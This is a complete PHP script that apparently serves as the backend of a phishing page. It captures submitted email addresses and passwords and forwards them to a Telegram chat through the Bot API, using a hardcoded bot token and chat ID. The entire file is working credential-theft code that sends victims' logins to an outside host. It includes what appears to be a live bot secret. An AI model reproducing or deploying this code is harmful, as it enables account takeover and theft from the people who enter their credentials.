<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $botToken = '7057202995:AAHTHaRaNjOQ4sNfqECDUihZHdKBz81p8FI'; // Replace with your bot token
    $chatId = '5716593834';     // Replace with your chat ID
    
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $message = "<b>Login Attempt</b>\n";
    $message .= "<b>Email:</b> " . htmlspecialchars($email) . "\n";
    $message .= "<b>Password:</b> " . htmlspecialchars($password) . "\n";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
    ];
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query($data);
    file_get_contents($url);
}
?>
